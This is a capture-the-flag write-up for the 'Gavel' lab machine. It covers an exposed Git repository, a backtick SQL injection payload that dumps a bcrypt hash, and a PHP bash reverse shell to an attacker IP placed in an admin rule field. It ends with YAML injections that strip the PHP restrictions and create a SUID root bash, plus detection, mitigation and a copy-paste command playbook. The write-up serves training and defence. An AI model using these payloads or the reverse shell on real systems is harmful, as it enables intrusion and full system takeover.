# Gavel

```
Difficulty: Medium
Operating System: Linux
Hints: True
```

## Summary of Attack Chain

| Step | User / Access | Technique Used | Result |
|  |  |  |  |
| 1 | `N/A` | **Port Scan & Host Discovery** | `nmap` revealed ports `22` (SSH) and `80` (HTTP). Added `gavel.htb` to `/etc/hosts`. |
| 2 | `N/A` | **Directory Fuzzing** | `ffuf` discovered `/.git/` repository exposed on the web server. |
| 3 | `N/A` | **Source Code Analysis** | Used `git-dumper` to extract source code. Identified SQLi vulnerability in `inventory.php` and RCE potential in admin rules. |
| 4 | `N/A` | **SQL Injection** | Exploited SQLi in `inventory.php` (via `user_id`/`sort` params) to dump the `auctioneer` bcrypt password hash. |
| 5 | `Attacker` | **Password Cracking** | Cracked the `auctioneer` hash offline using John the Ripper (`rockyou.txt`) to reveal password `midXXXXXX`. |
| 6 | `auth admin` | **Remote Code Execution (RCE)** | Logged into admin panel; injected PHP reverse shell code into the "Rules" section (processed via `runkit_function_add`). |
| 7 | `www-data` | **Reverse Shell & Pivot** | Triggered rule execution via `bid_handler.php` to get a shell. Stabilized shell and used password reuse (`midXXXXXX`) to `su auctioneer`. |
| 8 | `auctioneer` | **Local Enumeration** | Discovered `/usr/local/bin/gavel-util` which processes YAML files using PHP `runkit` with root privileges. |
| 9 | `auctioneer` | **PHP Config Injection (YAML)** | Submitted malicious YAML via `gavel-util` to overwrite `php.ini` and remove `open_basedir`/`disable_functions`. |
| 10 | `auctioneer` | **SUID Binary Creation (YAML)** | Submitted second YAML payload to copy `/bin/bash` to `/opt/gavel/rootbash` and set the SUID bit (`chmod u+s`). |
| 11 | `root` | **Privilege Escalation** | Executed `/opt/gavel/rootbash -p` to gain root access and retrieve the `/root/root.txt` flag. |


![Gavel](Gavel/HTB_2025-12-21_18-44MindMap.png)


## Reconnaissance

### Port Scanning

Traditionally, we begin with an Nmap scan and discover two open TCP ports: port `22` with SSH service OpenSSH 8.9p1 (Ubuntu) and port `80` with Apache httpd 2.4.52 web server.

```bash
nmap  -sC -sV -oN nmap_scan.txt 10.129.4.66
```

![Gavel](Gavel/HTB_2025-12-21_18-44_nmap_scan.png)


SSH is unlikely to be useful at this stage without credentials, so we'll focus our attention on exploring the web application as the most promising entry point.

**Open ports:**
- `22/tcp` (SSH - OpenSSH 8.9p1 Ubuntu)
- `80/tcp` (HTTP - Apache httpd 2.4.52)



### Adding Domain to hosts File

We add an entry to `/etc/hosts` for local domain name resolution. This is critically important because the Apache web server is configured to use virtual hosts and processes requests based on the HTTP `Host` header value. Without the proper hosts entry, we won't be able to access the full functionality of the web application.

```bash
echo "10.129.4.176 gavel.htb" | sudo tee -a /etc/hosts
```



### Website Exploration

Finally, we open a browser and after adding the domain, we can see the full-featured site:

```
http://gavel.htb
```

![Gavel](Gavel/HTB_2025-12-21_18-44_Web.png)


We're presented with a fantasy-themed auction web platform offering various virtual goods. The site implements full user registration functionality and a bidding system. From a **pentesting** perspective, this immediately points to potential **attack vectors**: `SQL` injections in login forms and filters, manipulation of `bid parameters`, and vulnerabilities in `transaction processing logic`. Any system where users submit numeric values (`bid amounts`, `lot IDs`) deserves close attention.



![Gavel](Gavel/HTB_2025-12-21_18-44_Webreg.png)


Obviously, for further exploration, we need to register — most functionality is hidden behind authentication, and without an account, we won't be able to interact with the bidding and auction system. Let's create a test account and log in.






As mentioned earlier, this application implements auction lot mechanics and subsequent purchasing. The very fact that there's a form through which users place bids should immediately suggest that the key interaction happens with the values transmitted within this form. This means the server processes most of the logic based on data sent by the client in requests.

### Directory Discovery

Now let's conduct reconnaissance of the web application structure. We'll use `ffuf` to search for hidden files and directories — developers often leave service scripts, backups, or configuration files publicly accessible, which can reveal additional attack vectors:

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt \
     -u http://gavel.htb/FUZZ -e .php
```


**What we find:**
- `/admin.php` — admin panel (currently inaccessible without credentials)
- `/inventory.php` — inventory of goods
- `/.git/` — **exposed Git repository!** (This is a serious finding)

![Gavel](Gavel/HTB_2025-12-21_18-58_gitexposed.png)

### Extracting Source Code from Git Repository

Since we've found a goldmine, we'll use the specialized tool `git-dumper` to extract it, which recursively downloads all Git objects and restores the complete project structure:

```bash
git-dumper http://gavel.htb/.git/ ./gavel-source
```

![Gavel](Gavel/HTB_2025-12-21_19-10_gitdumper.png)

Now we have full access to the application's source code — this significantly simplifies vulnerability discovery. I think when analyzing the code, we should focus on critical files: `admin.php`, `inventory.php`, `login.php`, and the `includes/` directory. We also pay special attention to: SQL queries, configuration files, authentication logic, and user data processing.

At this stage, I spent considerable time understanding the application structure. I used everything: various analysis tools, AI assistance, and my own PHP and web development knowledge. In the end, persistence paid off — detailed examination of the source code revealed critical vulnerabilities:

1. **SQL Injection in `inventory.php`** — the `user_id` and `sort` parameters are passed into the SQL query without proper sanitization, allowing arbitrary SQL commands to be executed through backtick injection
2. **Unsafe rule processing in admin panel** — the dynamic rule system for auctions uses `runkit_function_add()` to dynamically create PHP functions from user input, which opens the possibility for Remote Code Execution (RCE)
3. **Lack of rate limiting** on critical endpoints — allows brute-forcing credentials

Finally, we can form a complete attack chain: SQL Injection → credential extraction → admin panel access → RCE through the rule system.





### SQL Injection for Credential Extraction

As I mentioned above, the `inventory.php` file immediately caught my attention — the way user parameters were processed seemed too suspicious. After more detailed analysis, my suspicions were confirmed: the `user_id` and `sort` parameters go directly into the SQL query without any filtering. Classic SQL injection through backtick injection. For exploitation, we use the following payload:

```
http://gavel.htb/inventory.php?user_id=x`+FROM+(SELECT+group_concat(username,0x3a,password)+AS+`%27x`+FROM+users)y;--+-&sort=\?;--+-%00
```


![Gavel](Gavel/HTB_2025-12-21_18-44_Web_SQLIn.png)


Key points for bypassing PDO:
- `\?` — backslash before the question mark breaks parameter detection, since PDO scans for `?` placeholders **before** MySQL syntax parsing and doesn't recognize the escaped version
- `%00` — null byte causes string truncation at the C level in the MySQL driver, effectively "cutting off" the rest of the query

The response returns credentials for user `auctioneer`, the password is of course in bcrypt hash form, but that's just a matter of technique.




**Example result:** - auctioneer:$2y$10$MNkDHV6g16FjW/lAQRpLiuQXN4MVkdMuILn0pLQlC2So9SgH5RTfS...

### Password Cracking

Now we need to crack this hash. First, we save it to a file:

```bash
echo 'auctioneer:$2y$10$MNkDHV6g16FjW/lAQRpLiuQXN4MVkdMuILn0pLQlC2So9SgH5RTfS' > hash.txt
```

Then we unleash John the Ripper with the classic rockyou.txt. Bcrypt is not a fast method for us, but as I mentioned, this requires patience and persistence. If the password is weak, we have a chance:

```bash
john --format=bcrypt --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

**Result:** - Password: midXXXXXX


![Gavel](Gavel/HTB_2025-12-21_18-44_auctcred_hashcrack.png)

### Logging into Admin Panel

Now for the most interesting part — we go to the admin panel and use the credentials we already have (login and password - `auctioneer:midXXXXXX`)


![Gavel](Gavel/HTB_2025-12-21_18-44_Webadminlogin.png)

And what do we see: as an administrator, we have infinite local coins with which we can simply buy out the entire auction and live happily. I admit, I couldn't resist and spent a couple of minutes buying all the lots and my inner collector was satisfied! But, as we remember, we're interested in something completely different — we're not here for virtual trophies, but for complete control over the system.


![Gavel](Gavel/HTB_2025-12-21_18-44_Webadminloginpage.png)



## Getting Reverse Shell

Next, in the admin panel we find the Rules section — this is where our attack vector is hiding. This section allows the administrator to set dynamic rules for auction lots. As we discovered earlier when analyzing the source code, these rules are processed through `runkit_function_add()`, which means direct execution of PHP code on the server. You'll see 3 items with timers — the system periodically recalculates rules for active lots, and it's at this moment that our malicious code will be executed.




Essentially, the mechanism works like this: when the lot update timer triggers, the server takes the string from the `rule` field and executes it as `PHP code`. Classic **Remote Code Execution (RCE)** vulnerability through unsafe user input processing (code injection).

Now the most interesting part begins — everything before this can be considered preparation. We need to inject a `reverse shell payload` into the rule field and wait for its execution. First, we prepare the listener. Open a new terminal and start netcat in listening mode:

```bash
nc -lvnp 4444
```
You can also replace `4444` with any free port you want to use.

To automate further actions, we'll need the session cookie — without it, the server won't authorize our API requests. The fact is that the web application uses the standard PHP session mechanism: upon authorization, the server generates a unique session identifier and saves it in the `PHPSESSID` cookie (or `gavel_session` — depending on the application configuration). This identifier binds all our requests to the authorized administrator session.

Extract the cookie through browser DevTools:

**Chrome:** `F12` → `Application` tab → `Storage` section → `Cookies` → `gavel.htb`

**Firefox:** `F12` → `Storage` tab → `Cookies` → `gavel.htb`

Copy the cookie value (usually a long string like `XXXXXXXXXXXXXXXXXXXXXXXXX`). We'll pass this token in the `Cookie` header when executing curl requests so the server perceives them as actions of an authorized administrator.



Now we need to get the `auction_id` of active lots. As I mentioned, items in the system have update timers — this is a window of opportunity for exploitation. When the timer triggers, the server executes the rule for that lot, and it's at this moment that our payload will be executed. But to place a bid on the right lot and trigger rule execution, we need to know its identifier.

Parse the bidding page and extract `auction_id` using curl and grep:



After obtaining `auction_id`, we proceed to the key stage — injecting the reverse shell payload. We return to the admin panel, find the **Rules** section, and edit the rule for one of the active lots.

In the rule field, we insert the following PHP code:

```php
system('bash -c "bash -i >& /dev/tcp/XX:XX:XX:XX/4444 0>&1"'); return true;
```

![Gavel](Gavel/HTB_2025-12-21_18-44_Webrevshell.png)


Now we trigger the execution of our payload. Open a new terminal (netcat should continue listening in the first one) and send a POST request to the bid handler:

```bash
curl -X POST 'http://gavel.htb/includes/bid_handler.php' \
     -H 'X-Requested-With: XMLHttpRequest' \
     -H 'Cookie: PHPSESSID=XXXXXXXXXXXXXXXXXXXXXXXXXXXX' \
     -d 'auction_id=1&bid_amount=50000'
```

![Gavel](Gavel/HTB_2025-12-21_18-44_auctionid.png)


At this very moment, when we entered our payload, the server checks the rules for the lot, our code is executed, a reverse connection to netcat is initiated, and at this moment we should receive a shell.

Also, it's very important not to forget to change auction_id to the current one and cookie to your session. Lots may have different or identical lifetimes, so keep this in mind — it's important.


![Gavel](Gavel/HTB_2025-12-21_18-44_bid.png)


### Shell Stabilization and Switching to auctioneer User

After getting the reverse shell, we find ourselves in a "raw" environment as `www-data`. Here's what we see in the netcat terminal:



This is a so-called "dumb" shell — tab completion doesn't work, up/down arrows don't scroll through command history, and `Ctrl+C` will simply kill the connection. First, we stabilize the shell through Python:

```
www-data@gavel:/var/www/html/gavel/includes$ python3 -c 'import pty; pty.spawn("/bin/bash")'
www-data@gavel:/var/www/html/gavel/includes$
```

![Gavel](Gavel/HTB_2025-12-21_18-44_webshellpng.png)


The `pty` module creates a pseudo-terminal that emulates a real TTY. Now the shell thinks it's working in a full-featured terminal — tab completion appears and commands work correctly.

### Switching to auctioneer User

Currently, we're working as user `www-data` — this is a service account under which the Apache web server runs. It has minimal privileges and limited system access. However, we have an ace up our sleeve — remember the password `midXXXXXX` that we obtained through SQL injection and cracked using John the Ripper?

We're very lucky and it turns out that user `auctioneer` uses the same password for both the web application and the system account. We don't waste time and switch:

```
www-data@gavel:/var/www/html/gavel/includes$ su auctioneer
Password: midXXXXXX
auctioneer@gavel:/var/www/html/gavel/includes$ cd /home/auctioneer
auctioneer@gavel:~$
```

![Gavel](Gavel/HTB_2025-12-21_18-44actionerrshell.png)



If everything went successfully, the command prompt will change from `www-data@gavel` to `auctioneer@gavel`. Now we have access to the user's home directory and files.

First goal achieved — we've gained access to a system user. Now we need to find the flag. We use the find command for searching:

```bash
find / -name "root.txt" 2>/dev/null
find /home -name "user.txt" 2>/dev/null
```
The search result shows the path: `/home/auctioneer/user.txt`.

We successfully retrieve the flag!

```bash
cat /home/auctioneer/user.txt
```

![Gavel](Gavel/HTB_2025-12-21_18-44userflag.png)


## Privilege Escalation to Root

### System Exploration

Now begins the privilege escalation phase. We explore the system for interesting files and utilities:

```bash
auctioneer@gavel:~$ ls -la /opt/gavel/
auctioneer@gavel:~$ ls -la /usr/local/bin/
```

When exploring the system, we discover the `gavel-util` utility in `/usr/local/bin/`. This utility allows sending YAML files with descriptions of auction items. The key point: the `rule` field in YAML is processed by the same `runkit_function_add()` mechanism we used to get the reverse shell, but now the code executes with elevated privileges!


![Gavel](Gavel/HTB_2025-12-21_18-44sysfiles.png)


### YAML Injection — Two-Stage Attack

The attack consists of two stages: first we disable the PHP sandbox, then we create a SUID copy of bash.

#### Stage 1: Disabling PHP Restrictions

We create a YAML file that overwrites the PHP configuration, removing all protective restrictions (`open_basedir`, `disable_functions`):

```bash
auctioneer@gavel:~$ echo 'name: fixini' > fix_ini.yaml
auctioneer@gavel:~$ echo 'description: fix php ini' >> fix_ini.yaml
auctioneer@gavel:~$ echo 'image: "x.png"' >> fix_ini.yaml
auctioneer@gavel:~$ echo 'price: 1' >> fix_ini.yaml
auctioneer@gavel:~$ echo 'rule_msg: "fixini"' >> fix_ini.yaml
auctioneer@gavel:~$ echo "rule: file_put_contents('/opt/gavel/.config/php/php.ini', \"engine=On\\ndisplay_errors=On\\nopen_basedir=\\ndisable_functions=\\n\"); return false;" >> fix_ini.yaml
```

Submit the file for processing:

```bash
auctioneer@gavel:~$ /usr/local/bin/gavel-util submit /home/auctioneer/fix_ini.yaml
Item submitted for review in next auction
```

![Gavel](Gavel/HTB_2025-12-21_18-44disbledphprestrictions.png)


> **Important:** Wait a few seconds while the system processes the YAML and executes the code from the `rule` field.

#### Stage 2: Creating SUID bash

Now that PHP restrictions are removed, we create a YAML file that will copy `/bin/bash` and set the SUID bit on the copy:

```bash
auctioneer@gavel:~$ echo 'name: rootshell' > rootshell.yaml
auctioneer@gavel:~$ echo 'description: make suid bash' >> rootshell.yaml
auctioneer@gavel:~$ echo 'image: "x.png"' >> rootshell.yaml
auctioneer@gavel:~$ echo 'price: 1' >> rootshell.yaml
auctioneer@gavel:~$ echo 'rule_msg: "rootshell"' >> rootshell.yaml
auctioneer@gavel:~$ echo "rule: system('cp /bin/bash /opt/gavel/rootbash; chmod u+s /opt/gavel/rootbash'); return false;" >> rootshell.yaml
```

Submit for execution:

```bash
auctioneer@gavel:~$ /usr/local/bin/gavel-util submit /home/auctioneer/rootshell.yaml
Item submitted for review in next auction
```

![Gavel](Gavel/HTB_2025-12-21_18-44SUIDbashcreation.png)


### Obtaining ROOT Privileges

After processing the second YAML file, we check if the SUID file was created:

```bash
auctioneer@gavel:~$ ls -l /opt/gavel/rootbash
-rwsr-xr-x 1 root root 1396520 Dec  5 20:26 /opt/gavel/rootbash
```

![Gavel](Gavel/HTB_2025-12-21_18-44Ssupermrootpng.png)


Excellent! We see the `s` flag in the permissions (`-rwsr-xr-x`) — this means the SUID bit is set. Now any user who runs this file will get the owner's (root) privileges.

We run rootbash with the `-p` flag (preserve privileges) to maintain elevated privileges:

```bash
auctioneer@gavel:~$ /opt/gavel/rootbash -p
rootbash-5.1# whoami
root
```

We've obtained root access! Now we retrieve the final flag:

```bash
rootbash-5.1# cat /root/root.txt
XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
```


![Gavel](Gavel/HTB_2025-12-21_18-44SRoot_flag.png)



# Short Notes




## PHASE 1: Strategic Overview

* **1.1 Definition** – The target is a web‑hosted auction platform (gavel.htb) running Apache 2.4.52 on Ubuntu with OpenSSH 8.9p1 exposed on port 22 and HTTP on port 80. The application hosts a public Git repository, an admin panel that dynamically executes PHP code via `runkit_function_add()`, and a local utility (`gavel‑util`) that processes YAML files under elevated privileges.
* **1.2 Impact** – Primary objectives are to gain full control of the host: obtain user credentials, achieve remote code execution (RCE), pivot to the web server account (`www‑data`), elevate to the system user `auctioneer`, and finally acquire root via SUID escalation.
* **1.3 The Scenario** – A classic “web → admin → local → root” chain:  
  * Web discovery → exposed Git repo → source code analysis → SQLi → credential extraction.  
  * Admin login → injection of PHP reverse shell in the rule engine → pivot to `www‑data`.  
  * Password reuse → `su auctioneer`.  
  * YAML injection via `gavel‑util` → disable PHP sandbox, copy `/bin/bash`, set SUID bit.  
  * Execute SUID binary → root shell and flag retrieval.



## PHASE 2: System Archotecture & Theory

* **2.1 Protocol Environment** – Linux (Ubuntu) with Apache 2.4.52, PHP 7.x (runkit extension enabled), OpenSSH 8.9p1, MySQL/MariaDB backend, and custom binaries in `/usr/local/bin/` (`gavel‑util`).  
* **2.2 Attack Logic Flow**  
> **Web Server (Apache) ➜ Admin Panel (PHP with runkit) ➜ Remote Shell (www‑data) ➜ Password reuse (auctioneer) ➜ YAML injection (gavel‑util) ➜ SUID bash (root)**  
  Each hop exploits a privilege boundary: web → admin (SQLi), admin → web server (RCE), web server → system user (password reuse), system user → root (SUID).
* **2.3 Theoretical Analogy** – Think of the application as a multi‑storey building with a compromised front door (SQLi) that lets an intruder into the lobby (admin panel). From there, a faulty elevator (runkit) allows the intruder to ride directly to the basement (www‑data), then use a master key (reused password) to enter the staff room (auctioneer). Finally, a hidden service desk (YAML injection) hands over a magic key (SUID bash) that opens all doors.



## PHASE 3: The Attack Vector Mechanism

### THE CORE MECHANISM

| Attribute | Technical Details |
|  |  |
| **Primary Identifiers** | `inventory.php?user_id`, `sort` parameters; `admin.php` rule field (`runkit_function_add()`); `/usr/local/bin/gavel-util` YAML `rule` field. |
| **Critical Vulnerability** | Unsanitized SQL query in `inventory.php`; dynamic PHP code execution via runkit; YAML parser executing arbitrary PHP code with elevated privileges. |
| **Offensive Action** | 1) Inject backtick‑delimited payload to read users table and extract bcrypt hash. 2) Use stolen credentials to log into admin panel. 3) Insert reverse shell code in rule field (`system('bash -c "bash -i >& /dev/tcp/<IP>/4444 0>&1"')`). 4) Trigger rule via `bid_handler.php`. 5) Stabilize shell, `su auctioneer` using reused password. 6) Craft two YAML files: one to overwrite `php.ini`, another to copy `/bin/bash` and set SUID bit. 7) Execute SUID binary with `-p` flag for root shell.

### Prerequisites

* **Access Level** – Initial unauthenticated access to the web server; later admin credentials (SQLi‑derived).  
* **Connectivity** – TCP 22, TCP 80; reverse shell over TCP 4444.  
* **Target State** – Git repository publicly exposed (`/.git/`), runkit extension enabled in PHP, `gavel-util` executable with SUID privileges to the system user.



## PHASE 4: Threat Hunting & Anamoly Analysis

* **Hunt Hypothesis**  
  *Technique:* SQL injection via backtick payload.  
  *Artifacts:* HTTP requests containing backticks, `?user_id=` or `sort` parameters with `%00`.  
  *Data Sources:* Web server logs (`/var/log/apache2/access.log`, `/var/log/apache2/error.log`), MySQL slow‑query log if enabled.

* **Behavioral Outliers** – A request to `/inventory.php` containing a backtick immediately precedes a `SELECT group_concat(username,0x3a,password)` query. In normal operation the URL contains only numeric user IDs; any non‑numeric value is anomalous.

* **Toxic Combinations** –  
  * Admin session cookie (`PHPSESSID`) combined with rule injection payload → triggers RCE during scheduled lot updates.  
  * `www‑data` shell + reused password → `su auctioneer`.  
  * `auctioneer` user executing YAML that writes to `/opt/gavel/.config/php/php.ini` and copies `/bin/bash` → SUID escalation.



## PHASE 5: Detection Engineering

* **Telemetry Gap Analysis** –  
  * Windows events are not applicable; focus on Linux auditd, syslog, and PHP logs.  
  * **Audit Rules** to monitor:  
    - `auditctl -a always,exit -F arch=b64 -S execve -k php_exec` (captures `runkit_function_add()` calls).  
    - `auditctl -w /usr/local/bin/gavel-util -p x -k yaml_exec`.  
    - `auditctl -w /opt/gavel/.config/php/php.ini -p w -k ini_mod`.  
  * **Syslog**: Monitor `/var/log/apache2/access.log` for HTTP requests containing backticks or `%00`.

* **Detection-as-Code (KQL)** – Example for Azure Sentinel:

```kql
Heartbeat
| where TimeGenerated > ago(1h)
| union
    (AzureDiagnostics
     | where ResourceType == "Microsoft.Web/sites"
     | where Category == "AppServiceHTTPLogs")
| where Message contains "`" or Message contains "%00"
| project TimeGenerated, Computer, Message, ClientIP=ClientIP_s
```

* **Resilience Test** – An adversary could evade detection by:
  * Using a PID spoofing technique to rename the reverse shell process (`/bin/bash -c '...`).
  * Unhooking PHP logs or disabling auditd temporarily.

  **Sub‑Rule Countermeasure:**  
  ```bash
  # Ensure immutable flag on audit rule files
  chattr +i /etc/audit/rules.d/*.rules
  # Force auditd to reload after any change
  systemctl restart auditd
  ```



## PHASE 6: Toolkit & Implementation

* **Automation** –  
  * `nmap` for port discovery.  
  * `ffuf` for directory fuzzing.  
  * `git-dumper` to clone the exposed repo.  
  * Custom curl scripts with session cookie for admin actions.  
  * Python PTY wrapper (`pty.spawn('/bin/bash')`) for shell stabilization.  
  * Bash scripts to build YAML payloads and submit via `gavel-util`.  

* **OPSEC Analysis** –  
  * Avoid leaving the reverse shell open; close immediately after root access.  
  * Use short‑lived listener (nc -lvnp).  
  * Reuse credentials only on authorized accounts.

* **Post-Exploitation** –  
  * `hashcat` for hash cracking (bcrypt mode).  
  * `gavel-util` for YAML injection; no additional exploits needed.  
  * `chmod u+s /opt/gavel/rootbash` to create SUID binary.



## PHASE 7: Defensive Mitigation

* **Technical Hardening** –  
  1. Disable the runkit extension or enforce strict sanitization of user input before passing to `runkit_function_add()`.  
  2. Remove public access to `.git/` (e.g., via `.htaccess` deny).  
  3. Enforce parameterized queries in PHP; escape backticks.  
  4. Set `open_basedir`, `disable_functions`, and remove SUID bits from system utilities.  
  5. Enable auditd rules for execve on critical binaries (`gavel-util`).  

* **Personnel Focus** – Train developers to validate input, perform code reviews of dynamic code execution paths, and restrict web server privileges (use least‑privilege).  



## Quick Action Playbook

| Step | Objective | Technical Command / Logic |
|  |  |  |
| **01** | Enumerate open ports | `nmap -sV -p- 10.129.4.66` |
| **02** | Discover hidden directories | `ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://gavel.htb/FUZZ -e .php` |
| **03** | Clone exposed Git repo | `git-dumper http://gavel.htb/.git/ ./gavel-source` |
| **04** | SQLi payload for credential dump | `curl 'http://gavel.htb/inventory.php?user_id=x\`+FROM+(SELECT+group_concat(username,0x3a,password)+AS+%27x%27+FROM+users)y;--+-&sort=\?;--+-%00' -o out.html` |
| **05** | Crack bcrypt hash | `john --format=bcrypt --wordlist=/usr/share/wordlists/rockyou.txt hash.txt` |
| **06** | Admin login & RCE injection | `curl -b "PHPSESSID=<cookie>" -d 'rule=system(\"bash -c \\\"bash -i >& /dev/tcp/<IP>/4444 0>&1\\\"\"); return true;' http://gavel.htb/admin.php` |
| **07** | Trigger rule via bid handler | `curl -X POST http://gavel.htb/includes/bid_handler.php -H 'Cookie: PHPSESSID=<cookie>' -d 'auction_id=1&bid_amount=50000'` |
| **08** | Stabilize shell | `python3 -c 'import pty; pty.spawn(\"/bin/bash\")'` |
| **09** | Switch to auctioneer | `su auctioneer` (password: midXXXXXX) |
| **10** | Disable PHP sandbox via YAML | `cat > fix_ini.yaml <<EOF\nname: fixini\ndescription: fix php ini\nimage: \"x.png\"\nprice: 1\nrule_msg: \"fixini\"\nrule: file_put_contents('/opt/gavel/.config/php/php.ini', \"engine=On\\ndisplay_errors=On\\nopen_basedir=\\ndisable_functions=\\n\"); return false;\nEOF`<br>`/usr/local/bin/gavel-util submit fix_ini.yaml` |
| **11** | Create SUID bash via YAML | `cat > rootshell.yaml <<EOF\nname: rootshell\ndescription: make suid bash\nimage: \"x.png\"\nprice: 1\nrule_msg: \"rootshell\"\nrule: system('cp /bin/bash /opt/gavel/rootbash; chmod u+s /opt/gavel/rootbash'); return false;\nEOF`<br>`/usr/local/bin/gavel-util submit rootshell.yaml` |
| **12** | Execute SUID binary | `/opt/gavel/rootbash -p` |
| **13** | Retrieve root flag | `cat /root/root.txt` |


**Thanks you for read!**